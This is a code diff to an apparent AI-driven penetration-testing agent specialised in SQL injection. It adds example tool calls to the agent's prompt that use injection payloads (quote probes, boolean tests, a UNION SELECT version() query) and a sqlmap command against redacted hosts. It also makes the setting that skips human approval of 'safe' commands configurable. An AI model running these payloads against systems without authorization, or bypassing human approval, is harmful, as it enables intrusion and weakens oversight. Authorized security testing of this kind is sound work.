@@ -25,6 +25,7 @@ import type {
   ReactFinding,
 } from '../core/engine/react_loop';
 import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
+import type { HttpClient } from '../core/http/request_engine';
 
 const SQLI_SYSTEM_PROMPT = `You are an expert SQL Injection security researcher with deep knowledge of relational database internals (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), query parsing, ORM bypass techniques, and WAF evasion. You specialize in finding error-based, blind, union-based, second-order, and out-of-band SQL injection vulnerabilities in web applications.
 
@@ -96,7 +97,40 @@ IMPORTANT RULES:
 - Focus on proving the vulnerability exists, not on maximizing data extraction
 - A confirmed injection point with DBMS version is a complete finding
 - Always note the injection type (error-based, blind, union, etc.) and the parameter affected
-- Report the exact payload that triggered the injection`;
+- Report the exact payload that triggered the injection
+
+## Examples of Successful SQLi Discoveries
+
+### Example 1: Error-Based SQLi in Search Parameter
+**Step 1 — Probe for injection:**
+Tool call: http_request { url: "https://[redacted].com/api/search?q=test'", method: "GET" }
+Response: 500 — "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"
+
+**Step 2 — Confirm with boolean test:**
+Tool call: http_request { url: "https://[redacted].com/api/search?q=test' AND '1'='1", method: "GET" }
+Response: 200 OK — normal results returned
+
+Tool call: http_request { url: "https://[redacted].com/api/search?q=test' AND '1'='2", method: "GET" }
+Response: 200 OK — zero results (false condition) — boolean-based blind confirmed
+
+**Step 3 — Extract DBMS version:**
+Tool call: http_request { url: "https://[redacted].com/api/search?q=test' UNION SELECT version(),NULL,NULL-- -", method: "GET" }
+Response: 200 OK — results include "8.0.33-0ubuntu0.22.04.2" — MySQL 8.0 confirmed
+
+**Step 4 — Report:**
+Tool call: report_finding { title: "SQL Injection in /api/search 'q' parameter — MySQL 8.0, UNION+error-based", severity: "critical", vulnerability_type: "sqli_error", confidence: 98 }
+
+### Example 2: Blind Time-Based SQLi via sqlmap
+**Step 1 — Identify suspicious parameter:**
+Tool call: http_request { url: "https://[redacted].com/api/users?sort=name", method: "GET" }
+Response: 200 OK — sorted results
+
+**Step 2 — Run sqlmap for automated detection:**
+Tool call: execute_command { command: "sqlmap -u 'https://[redacted].com/api/users?sort=name' --level 3 --risk 2 --batch --technique=T --threads=1", target: "[redacted].com", category: "active_testing" }
+Result: Parameter 'sort' is vulnerable. Type: time-based blind. DBMS: PostgreSQL
+
+**Step 3 — Report:**
+Tool call: report_finding { title: "Blind SQL Injection in sort parameter — PostgreSQL, time-based", severity: "high", vulnerability_type: "sqli_blind_time", confidence: 90 }`;
 
 export class SqliHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
@@ -112,6 +146,7 @@ export class SqliHunterAgent implements BaseAgent {
   private model?: string;
   private findings: AgentFinding[] = [];
   private status: AgentStatus;
+  private autoApproveSafe = false;
   private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
   private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
 
@@ -130,9 +165,13 @@ export class SqliHunterAgent implements BaseAgent {
   setCallbacks(callbacks: {
     onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
     onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
+    autoApproveSafe?: boolean;
   }): void {
     this.onApprovalRequest = callbacks.onApprovalRequest;
     this.onExecuteCommand = callbacks.onExecuteCommand;
+    if (callbacks.autoApproveSafe !== undefined) {
+      this.autoApproveSafe = callbacks.autoApproveSafe;
+    }
   }
 
   async initialize(provider: ModelProvider, model: string): Promise<void> {
@@ -161,7 +200,7 @@ export class SqliHunterAgent implements BaseAgent {
         maxIterations: 30,
         target: task.target,
         scope: task.scope,
-        autoApproveSafe: false,
+        autoApproveSafe: this.autoApproveSafe,
         onApprovalRequest: this.onApprovalRequest,
         onExecuteCommand: this.onExecuteCommand,
         onFinding: (finding) => {
@@ -172,6 +211,8 @@ export class SqliHunterAgent implements BaseAgent {
           this.status.toolsExecuted = update.toolCallCount;
           this.status.lastUpdate = Date.now();
         },
+        httpClient: task.parameters.httpClient as HttpClient | undefined,
+        availableTools: task.parameters.availableTools as string[] | undefined,
       });
 
       const result = await loop.execute();
